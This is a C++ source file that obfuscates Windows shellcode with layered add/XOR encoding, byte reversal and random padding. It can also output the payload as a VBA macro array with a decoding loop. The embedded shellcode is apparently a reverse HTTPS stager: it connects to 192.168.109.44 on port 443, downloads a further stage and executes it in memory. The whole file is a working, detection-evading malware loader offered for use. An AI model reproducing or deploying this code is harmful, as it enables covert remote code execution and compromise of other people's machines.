#include <iostream>
#include <Windows.h>

char* Encrypt(char* pShellcode, int sShellcodeSize, unsigned char bKey) {
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] + bKey) & '\xFF') ^ bKey;
	}
	
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] + 'R') & '\xFF') ^ 'Q';
	}

	for (size_t i = 0; i < sShellcodeSize / 2; i++) {
		char temp = pShellcode[i];
		pShellcode[i] = pShellcode[sShellcodeSize - i - 1];
		pShellcode[sShellcodeSize - i - 1] = temp;
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] + '\\') & '\xFF') ^ '\n';
	}
	
	char* rShellcode = (char*)malloc(sizeof(char) * (2 * sShellcodeSize));

	for (size_t i = 0; i < 2 * sShellcodeSize; i++) {
		if (i % 2 == 0) {
			rShellcode[i] = pShellcode[i / 2];
		}
		else {
			rShellcode[i] = (char) rand() % 256;
		}
	}
	return rShellcode;
}
char* Decrypt(char* rShellcode, int sShellcodeSize, unsigned char bKey) {
	
	sShellcodeSize = sShellcodeSize / 2;
	char* pShellcode = (char*)malloc((sShellcodeSize) * sizeof(char));

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = rShellcode[i * 2];
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ '\n') - '\\') & '\xFF';
	}

	for (size_t i = 0; i < sShellcodeSize / 2; i++) {
		char temp = pShellcode[i];
		pShellcode[i] = pShellcode[sShellcodeSize - i - 1];
		pShellcode[sShellcodeSize - i - 1] = temp;
	}

	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ 'Q') - 'R') & '\xFF';
	}
	
	for (size_t i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = ((pShellcode[i] ^ bKey) - bKey) & '\xFF';
	}

	return pShellcode;
}


void EncryptVBA(char* pShellcode, int sShellcodeSize) {
	for (size_t i = 0; i < sShellcodeSize; i++) {
		if (i % 2 == 0) {
			pShellcode[i] = ((pShellcode[i] + 2) & '\xFF');
		}
		else {
			pShellcode[i] = ((pShellcode[i] - 2) & '\xFF');
		}
	}
}

void Display(char* pShellcode, int sShellcodeSize) {
	printf("char shellcode[] =\n\"");

	// -1 to avoid terminator char
	for (size_t i = 0; i < sShellcodeSize; i++) {
		printf("\\x%02hhx", pShellcode[i]);
		if ((i+1) % 15 == 0) {
			printf("\"\n\"");
		}
	}
	printf("\";\n");

	printf("DWORD shellcodeSize = %d;\n\n", sShellcodeSize);
}

void DisplayVBA(char* pShellcode, int sShellcodeSize) {
	printf("shellcode = Array(");

	// -1 to avoid terminator char
	for (size_t i = 0; i < sShellcodeSize; i++) {
		printf("%u, ", (BYTE)pShellcode[i]);
		if ((i + 1) % 15 == 0) {
			printf(" _\n");
		}
	}
	printf(")\n\n");

	printf("For i = 0 To UBound(buf)\n"
		"   If i Mod 2 = 0 Then\n"
		"      buf(i) = (buf(i) - 2) And &HFF\n"
		"   Else\n"
		"      buf(i) = (buf(i) + 2) And &HFF\n"
		"   End If\n"
		"Next i");
}


int main()
{
	char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x8b\x72\x50"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
		"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b"
		"\x40\x20\x8b\x48\x18\x50\x49\x01\xd0\xe3\x56\x48\xff\xc9\x4d"
		"\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1"
		"\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
		"\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
		"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
		"\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
		"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
		"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e\x69"
		"\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c\x77\x26"
		"\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31\xc0\x4d\x31"
		"\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00\x00\x00\xff\xd5"
		"\xe8\x0f\x00\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x30"
		"\x39\x2e\x34\x34\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xbb\x01\x00"
		"\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89\x9f\xc6"
		"\x00\x00\x00\x00\xff\xd5\xe8\xc8\x00\x00\x00\x2f\x69\x2d\x57"
		"\x5a\x63\x65\x75\x55\x69\x5a\x65\x46\x6c\x6f\x53\x55\x34\x70"
		"\x6a\x77\x41\x77\x42\x46\x33\x44\x67\x4d\x52\x61\x39\x58\x56"
		"\x42\x79\x59\x6f\x67\x66\x6e\x49\x4d\x32\x42\x47\x51\x59\x68"
		"\x73\x2d\x69\x62\x42\x75\x43\x74\x59\x61\x61\x59\x66\x32\x54"
		"\x46\x6a\x6f\x65\x4f\x2d\x36\x61\x73\x63\x6e\x71\x44\x6a\x55"
		"\x67\x68\x65\x55\x79\x4c\x77\x48\x67\x6f\x4a\x4a\x33\x4f\x43"
		"\x38\x4a\x62\x61\x33\x6a\x6e\x46\x67\x71\x67\x32\x36\x34\x43"
		"\x70\x50\x6f\x6d\x61\x43\x47\x45\x37\x61\x58\x6e\x78\x38\x65"
		"\x53\x61\x4b\x43\x44\x46\x4a\x30\x6a\x69\x7a\x5a\x6c\x78\x4f"
		"\x30\x2d\x42\x46\x39\x51\x79\x4f\x34\x54\x47\x58\x7a\x76\x45"
		"\x72\x4b\x73\x77\x63\x7a\x6b\x46\x34\x38\x46\x71\x75\x67\x58"
		"\x68\x73\x78\x4b\x45\x4a\x78\x41\x42\x5f\x45\x4a\x78\x48\x5a"
		"\x6a\x55\x79\x53\x73\x50\x6e\x4d\x50\x4a\x71\x73\x62\x6e\x6a"
		"\x00\x48\x89\xc1\x53\x5a\x41\x58\x4d\x31\xc9\x53\x48\xb8\x00"
		"\x32\xa8\x84\x00\x00\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb\x55"
		"\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x6a\x1f"
		"\x5a\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04\x41\x59\x49"
		"\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x4d\x31\xc0\x53"
		"\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9\x53\x53\x49\xc7\xc2"
		"\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1f\x48\xc7\xc1\x88\x13"
		"\x00\x00\x49\xba\x44\xf0\x35\xe0\x00\x00\x00\x00\xff\xd5\x48"
		"\xff\xcf\x74\x02\xeb\xaa\xe8\x55\x00\x00\x00\x53\x59\x6a\x40"
		"\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7\xc0\x00\x10\x00\x00\x49"
		"\xba\x58\xa4\x53\xe5\x00\x00\x00\x00\xff\xd5\x48\x93\x53\x53"
		"\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00"
		"\x00\x49\x89\xf9\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff"
		"\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3"
		"\x85\xc0\x75\xd2\x58\xc3\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5"
		"\xa2\x56\xff\xd5";


	int choice = 0;

	DWORD shellcodeSize = 754;

	if (choice == 0) {
		char* encShellcode = Encrypt(shellcode, shellcodeSize, '"');
		char* decShellcode = Decrypt(encShellcode, shellcodeSize * 2, '"');

		Display(encShellcode, shellcodeSize * 2);
		Display(decShellcode, shellcodeSize);
	}
	else if (choice == 1) {
		EncryptVBA(shellcode, shellcodeSize);

		DisplayVBA(shellcode, shellcodeSize);

	}

	return 0;
}
